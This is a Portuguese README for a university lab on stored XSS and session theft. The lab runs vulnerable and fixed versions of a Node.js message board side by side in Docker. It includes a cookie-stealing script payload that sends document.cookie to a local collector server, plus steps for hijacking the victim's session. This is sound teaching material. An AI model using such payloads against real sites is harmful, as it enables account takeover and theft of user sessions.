# Laboratório: XSS Armazenado e Roubo de Sessão

Projeto da disciplina **Segurança e Auditoria de Sistemas (GER383830A)** — Universidade Feevale.
**Dupla:** João Oliveira e Mateus Wolke.

> ⚠️ **Aviso.** Esta aplicação é **propositalmente vulnerável** e serve **apenas** para estudo
> em laboratório isolado, na própria máquina. **Não** a exponha na internet nem a utilize em
> produção. Toda a exploração ocorre contra a aplicação criada pela própria dupla.

## O que é

Um **mural de recados** simples (cadastro, login, sessão por cookie e recados públicos),
construído em **Node.js + Express + SQLite**, em **duas versões lado a lado**:

| Versão | Pasta | URL | Estado |
|--------|-------|-----|--------|
| Vulnerável | [`vulneravel/`](vulneravel/) | http://localhost:3001 | XSS armazenado, cookie sem `HttpOnly`, sem CSP |
| Corrigida | [`corrigida/`](corrigida/) | http://localhost:3002 | Output encoding, CSP, cookie `HttpOnly+SameSite+Secure`, validação |
| Coletor (atacante) | [`coletor/`](coletor/) | http://localhost:3009 | Recebe os cookies roubados na demonstração |

A falha estudada é o **Cross-Site Scripting Armazenado (Stored XSS) — [CWE-79](https://cwe.mitre.org/data/definitions/79.html)**,
usado para **roubar o cookie de sessão** de outra conta e **sequestrar a sessão**.

## Requisitos

- **Docker** + **Docker Compose** (Docker Desktop no macOS). Nada mais precisa ser instalado no host.
- ~1 GB de RAM livre é suficiente (containers pequenos; não há VMs).

> Detalhe técnico: as imagens usam **Node 22** e o módulo **`node:sqlite`** (SQLite embutido no
> Node, ativado com `--experimental-sqlite`). Assim **não há dependência nativa para compilar** —
> o `build` baixa apenas `express` e `ejs` (JavaScript puro). O Node emite um aviso de recurso
> experimental no log; é esperado.

## Como subir o laboratório

```bash
docker compose up --build
```

Depois, no navegador:

- Mural **vulnerável**: http://localhost:3001
- Mural **corrigido**: http://localhost:3002
- Painel do **coletor** (cookies capturados): http://localhost:3009

Para derrubar e apagar os dados (bancos e logs):

```bash
docker compose down -v
```

## Demonstração rápida (resumo)

O passo a passo completo está no [`runbook.md`](runbook.md). Em resumo:

1. No mural **vulnerável** (`:3001`), cadastre duas contas (ex.: `vitima` e `atacante`).
2. Logado como **atacante**, publique um recado com um payload de XSS armazenado, por exemplo:

   ```html
   <script>new Image().src="http://localhost:3009/steal?c="+encodeURIComponent(document.cookie)</script>
   ```

3. Faça login como **vitima** e abra o mural: o script roubado executa no navegador dela e
   envia o cookie de sessão dela para o coletor.
4. No painel do coletor (`:3009`), copie o `sid` da vítima e use-o para **se passar por ela**
   (sequestro de sessão).
5. Repita tudo no mural **corrigido** (`:3002`): o recado aparece como **texto**, o script **não
   executa**, e mesmo que executasse o cookie é `HttpOnly` (invisível ao JavaScript) — ataque bloqueado,
   sem quebrar a funcionalidade do mural.

## Ver a mitigação como código

As duas versões são propositalmente paralelas. Um `diff` mostra exatamente o que mudou na correção:

```bash
diff -ru vulneravel/ corrigida/
```

## Estrutura

```
.
├── docker-compose.yml        # orquestra os 3 serviços na rede isolada `labxss`
├── vulneravel/               # mural vulnerável (Stored XSS + cookie inseguro)
├── corrigida/                # mural corrigido (encoding + CSP + cookie seguro + validação)
├── coletor/                  # servidor do atacante (recebe os cookies)
└── runbook.md                # passo a passo de reprodução
```

## Referências

- MITRE. **CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')**.
- OWASP. **Cross Site Scripting Prevention Cheat Sheet**; **OWASP Top 10 — A03:2021 Injection**.
- Material da disciplina (Roteiros 3 e 6, Prof. Dr. Paulo Ricardo Muniz Barros): o WAF é apresentado
  como defesa contra XSS/SQL Injection e o tema consta entre as vulnerabilidades do OWASP Top Ten.
